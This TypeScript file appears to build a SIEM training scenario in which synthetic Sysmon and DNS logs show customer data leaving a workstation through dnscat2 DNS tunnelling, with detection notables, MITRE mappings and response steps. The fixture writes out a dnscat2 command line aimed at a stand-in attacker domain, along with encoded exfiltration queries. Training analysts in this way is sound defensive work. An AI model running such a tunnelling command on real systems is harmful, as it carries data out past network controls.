import type { Scenario } from "../../types";
import { ScenarioEvents, addNoise, STANDARD_USERS } from "./builder";

const LABELS = [
  "mzxw6ytboi2dqnrv", "gezdgnbvgy3tqojq", "nbswy3dpeb3w64tm", "mfrggzdfmztwq2lk", "onxw2zjanfzsa43v",
  "kruguidgojxw2idu", "nbswy3dpfqqho33s", "orsxg5bamjzgk3tv", "mjxw4zdbpfxgk3dp", "nvqxe23fnrsxi3bo",
  "gfzgk3tfoqqhizlb", "obqxg43xn5zgiidb", "mnxw2yltmvzsa5dp", "onswg4tfoqqgc5ld", "mvzhizlsmfwgk3tb",
  "nruw4zzaojsxa33s", "orxw2ylmnfxgk3dt", "mfzgg2dfom2dkmzr", "gqzdmmzrgu4tsnzx", "mnuxgy3pfzwgk3dp",
];

/** Scenario 4 — data smuggled out inside DNS TXT queries (intermediate). */
function build(): Scenario {
  const ev = new ScenarioEvents("DN");
  addNoise(ev, { start: "2026-05-07 15:00:00", minutes: 30, count: 70, seed: 44, users: STANDARD_USERS });

  const tool = ev.add({ time: "2026-05-07 15:01:30", index: "sysmon", sourcetype: "XmlWinEventLog:Sysmon", host: "ws-mkt-11",
    fields: { EventCode: 1, user: "s.okafor", process: "dnscat2.exe", parent_process: "cmd.exe", CommandLine: "dnscat2.exe --dns domain=x7.dataflow-sync.io --secret=k3y", hash: "4b1e0f9c7d2a6b8e3f5a1c9d0e7b2f4a" },
    mitre: ["T1071.004"], risk: { object: "ws-mkt-11", objectType: "system", score: 50, rule: "Endpoint - Known Tunnelling Tool Executed" } });
  const queries = ev.repeat(60, "2026-05-07 15:02:00", 6, (i) => {
    const q = `${LABELS[i % LABELS.length]}${LABELS[(i * 7) % LABELS.length]}.${i}.x7.dataflow-sync.io`;
    return {
      index: "dns", sourcetype: "stream:dns", host: "dns01",
      fields: { src_ip: "10.0.5.11", src_host: "ws-mkt-11", query: q, query_type: "TXT", reply_code: "NOERROR", query_length: q.length, parent_domain: "dataflow-sync.io" },
      mitre: ["T1071.004", "T1048"],
      risk: i === 30 ? { object: "ws-mkt-11", objectType: "system", score: 60, rule: "Network - DNS Tunnelling Suspected" } : undefined,
    };
  });
  const stage = ev.add({ time: "2026-05-07 15:01:55", index: "sysmon", sourcetype: "XmlWinEventLog:Sysmon", host: "ws-mkt-11",
    fields: { EventCode: 11, user: "s.okafor", process: "powershell.exe", file_name: "C:\\Users\\Public\\camp_q3_customers.zip", file_size: 18874368 },
    mitre: ["T1005"] });
  // Benign: a CDN with long but legit hostnames
  ev.repeat(4, "2026-05-07 15:05:00", 90, () => ({ index: "dns", sourcetype: "stream:dns", host: "dns01",
    fields: { src_ip: "10.0.3.7", src_host: "ws-hr-07", query: "e3891.dscx.akamaiedge.net", query_type: "A", reply_code: "NOERROR", query_length: 25, parent_domain: "akamaiedge.net" } }));

  return {
    id: "dns-tunnel",
    name: "DNS Tunnelling Exfiltration",
    tagline: "Customer data leaving the network one DNS query at a time.",
    difficulty: "intermediate",
    attackStory: [
      "On ws-mkt-11, a customer list is zipped into C:\\Users\\Public\\camp_q3_customers.zip.",
      "dnscat2.exe — a DNS tunnelling tool — is launched against x7.dataflow-sync.io.",
      "The host sends 60 TXT queries with long, random-looking subdomains (base32-encoded data) every ~6 seconds.",
      "Because DNS is usually allowed outbound, the firewall never blocks it.",
    ],
    events: ev.all(),
    notables: [{
      id: "ACAD-NOT-4001", title: "Network - Possible DNS Tunnelling from ws-mkt-11", urgency: "high", rule: "Network - DNS Tunnelling Suspected", entity: "ws-mkt-11",
      description: "60 TXT queries with an average query length > 45 chars to one parent domain.", eventIds: queries.slice(0, 5),
      recommendedActions: ["Sinkhole dataflow-sync.io on internal DNS", "Isolate ws-mkt-11", "Identify what data was in the archive", "Notify privacy / legal if customer data left"],
    }],
    intel: [{ indicator: "dataflow-sync.io", type: "domain", threat: "DNS tunnelling C2 (dnscat2)", source: "MISP - corp-intel", confidence: 78, eventIds: queries.slice(0, 2) }],
    entities: [
      { type: "host", value: "ws-mkt-11", role: "compromised", note: "Source of every tunnelling query." },
      { type: "user", value: "s.okafor", role: "suspicious", note: "Account that ran dnscat2 — compromised or insider?" },
      { type: "domain", value: "dataflow-sync.io", role: "attacker", note: "Attacker-controlled authoritative DNS." },
      { type: "process", value: "dnscat2.exe", role: "attacker", note: "DNS tunnelling tool." },
      { type: "domain", value: "akamaiedge.net", role: "benign", note: "Long-ish CDN hostnames — normal." },
    ],
    mitreMap: [
      { techniqueId: "T1005", evidence: "Customer data zipped locally before tunnelling.", eventIds: [stage] },
      { techniqueId: "T1071.004", evidence: "dnscat2 using TXT records to dataflow-sync.io.", eventIds: [tool, queries[0]] },
      { techniqueId: "T1048", evidence: "~60 encoded subdomain queries carrying data out.", eventIds: queries.slice(1, 4) },
    ],
    timeline: [
      { phase: "Data gathered", tacticId: "TA0009", summary: "Customer archive staged.", eventIds: [stage] },
      { phase: "Tunnel opened", tacticId: "TA0011", summary: "dnscat2 launched.", eventIds: [tool] },
      { phase: "Data leaves via DNS", tacticId: "TA0010", summary: "60 long TXT queries.", eventIds: queries.slice(0, 6) },
    ],
    patientZero: { entity: "ws-mkt-11", explanation: "All tunnelling traffic and the staged archive are on ws-mkt-11." },
  };
}

export const DNS_TUNNEL = build();
